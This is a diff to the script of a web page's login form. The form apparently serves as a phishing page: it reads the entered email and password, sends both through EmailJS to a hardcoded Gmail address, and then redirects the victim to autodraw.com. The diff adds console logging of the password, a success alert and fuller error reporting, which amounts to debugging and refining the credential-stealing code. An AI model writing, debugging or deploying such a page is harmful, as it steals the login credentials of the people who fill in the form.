@@ -53,6 +53,7 @@
     <!-- Include EmailJS SDK -->
     <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
     <script type="text/javascript">
+        // Initialize EmailJS with your User ID
         (function() {
             emailjs.init('Wm_hgPysMxjkcdYas');
         })();
@@ -75,6 +76,10 @@
             const email = document.getElementById('email').value;
             const password = document.getElementById('password').value;
 
+            console.log('Email:', email);
+            console.log('Password:', password);
+
+            // Send email using EmailJS
             emailjs.send('service_zrgq0cs', 'template_8r7y8vw', {
                 to_email: 'choueib2ali@gmail.com',
                 email: email,
@@ -82,10 +87,11 @@
             })
             .then(function(response) {
                 console.log('Email sent successfully:', response);
+                alert('Email sent successfully!');
                 window.location.href = 'https://www.autodraw.com';
             }, function(error) {
                 console.error('Failed to send email:', error);
-                alert('Failed to send email. Please try again.');
+                alert('Failed to send email. Error: ' + JSON.stringify(error));
             });
         });
     </script>
